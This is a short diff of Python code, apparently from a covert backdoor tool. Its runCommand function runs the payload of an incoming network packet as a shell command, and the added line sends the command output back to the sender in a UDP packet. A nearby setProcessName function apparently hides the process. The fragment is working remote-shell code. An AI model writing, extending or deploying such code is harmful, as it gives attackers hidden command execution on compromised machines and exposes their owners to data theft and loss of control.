@@ -38,6 +38,7 @@ def runCommand(packet):
   output = subprocess.check_output(packet.load, shell=True, stderr=subprocess.STDOUT)
   print output
   packet = IP(packet[IP].src)/UDP(dport=int(args.sourcePort), sport=int(args.destPort))/Raw(load=output)
+  send(packet)
 
 # if
 def setProcessName():
